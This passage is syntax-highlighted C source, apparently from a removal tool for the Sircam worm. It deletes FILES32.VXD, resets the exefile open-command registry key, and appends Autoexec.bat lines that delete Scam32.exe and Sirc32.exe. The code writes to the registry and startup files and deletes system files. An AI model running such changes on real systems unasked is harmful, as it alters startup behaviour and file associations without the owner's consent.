    </span><span class="sc11">rProcessFound</span><span class="sc10">=</span><span class="sc11">Process32Next</span><span class="sc10">(</span><span class="sc11">lSnapshot</span><span class="sc10">,&amp;</span><span class="sc11">uProcess</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0">
  </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">lSnapshot</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">Sleep</span><span class="sc10">(</span><span class="sc4">500</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">GetSystemDirectory</span><span class="sc10">((</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">sysy</span><span class="sc10">,</span><span class="sc4">100</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">sysy</span><span class="sc10">,</span><span class="sc6">"\\FILES32.VXD"</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">DeleteFile</span><span class="sc10">(</span><span class="sc11">sysy</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">Sircam</span><span class="sc10">()</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc16">register</span><span class="sc0"> </span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">sirc</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc16">register</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">sysyt</span><span class="sc10">[</span><span class="sc4">100</span><span class="sc10">],</span><span class="sc11">aut</span><span class="sc10">[</span><span class="sc4">100</span><span class="sc10">];</span><span class="sc0">
  </span><span class="sc16">register</span><span class="sc0"> </span><span class="sc11">FILE</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">ab</span><span class="sc10">;</span><span class="sc0">

  </span><span class="sc11">RegOpenKeyEx</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc6">"exefile\\shell\\open\\command"</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">KEY_WRITE</span><span class="sc10">,&amp;</span><span class="sc11">RunKey</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">RegSetValueEx</span><span class="sc10">(</span><span class="sc11">RunKey</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">""</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">REG_SZ</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">BYTE</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc6">"\"%1\" %*"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">7</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">RegCloseKey</span><span class="sc10">(</span><span class="sc11">RunKey</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">GetSystemDirectory</span><span class="sc10">((</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">sysyt</span><span class="sc10">,</span><span class="sc4">100</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">sysyt</span><span class="sc10">,</span><span class="sc6">"\\Scam32.exe"</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">sirc</span><span class="sc10">=</span><span class="sc11">FindFirstFile</span><span class="sc10">(</span><span class="sc11">sysyt</span><span class="sc10">,&amp;</span><span class="sc11">wfd</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">sirc</span><span class="sc10">!=</span><span class="sc11">INVALID_HANDLE_VALUE</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">SetFileAttributes</span><span class="sc10">(</span><span class="sc11">sysyt</span><span class="sc10">,</span><span class="sc11">FILE_ATTRIBUTE_NORMAL</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">SetFileAttributes</span><span class="sc10">(</span><span class="sc6">"c:\\Autoexec.bat"</span><span class="sc10">,</span><span class="sc11">FILE_ATTRIBUTE_NORMAL</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">ab</span><span class="sc10">=</span><span class="sc11">fopen</span><span class="sc10">(</span><span class="sc6">"c:\\Autoexec.bat"</span><span class="sc10">,</span><span class="sc6">"a+"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">aut</span><span class="sc10">,</span><span class="sc6">"\n@if exist "</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">aut</span><span class="sc10">,</span><span class="sc11">sysyt</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">aut</span><span class="sc10">,</span><span class="sc6">" del "</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">aut</span><span class="sc10">,</span><span class="sc11">sysyt</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">ab</span><span class="sc10">,</span><span class="sc11">aut</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">ab</span><span class="sc10">,</span><span class="sc6">"\nattrib -r -h -s c:\\recycled\\*.*"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">ab</span><span class="sc10">,</span><span class="sc6">"\ndel c:\\recycled\\Sirc32.exe"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">fclose</span><span class="sc10">(</span><span class="sc11">ab</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0">

</span><span class="sc10">}</span><span class="sc0">

</span></div></body>
</html>
